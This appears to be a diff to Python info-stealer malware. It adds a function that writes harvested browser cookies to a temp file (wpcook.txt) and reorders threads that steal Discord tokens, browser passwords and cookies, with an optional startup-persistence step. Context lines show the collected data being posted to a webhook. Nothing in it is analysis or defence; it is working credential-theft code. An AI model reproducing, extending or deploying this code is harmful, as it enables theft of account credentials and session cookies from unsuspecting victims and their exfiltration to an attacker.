@@ -990,6 +990,8 @@ def paaz():
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
+
+def paaaz():
     try:
         file = os.getenv("TEMP") + f"\wpcook.txt"
         filename = "wpcook.txt"
@@ -1191,8 +1193,12 @@ def GatherAll():
     a = threading.Thread(target=getinfo)
     a.start()
     Threadlist.append(a)
-    
-        
+    threadlist2 = []
+
+    coo = threading.Thread(target=getcook)
+    coo.start()
+    threadlist2.append(coo)
+
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
@@ -1201,30 +1207,30 @@ def GatherAll():
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         di.start()
         Threadlist.append(di)
-    threadlist2 = []
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
         threadlist2.append(pa)
         
-    coo = threading.Thread(target=getcook)
-    coo.start()
-    threadlist2.append(coo)
-
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
         threadlist2.append(sta)
     else:
         pass
+    
+    
     for thread in threadlist2:
         thread.join()
-
+    paz = threading.Thread(target=paaz)
+    paz.start()
+    Threadlist.append(paz)
+    
     scr = threading.Thread(target=srcs)
     scr.start()
     Threadlist.append(scr)
-
-    paz = threading.Thread(target=paaz)
+    
+    paz = threading.Thread(target=paaaz)
     paz.start()
     Threadlist.append(paz)
     
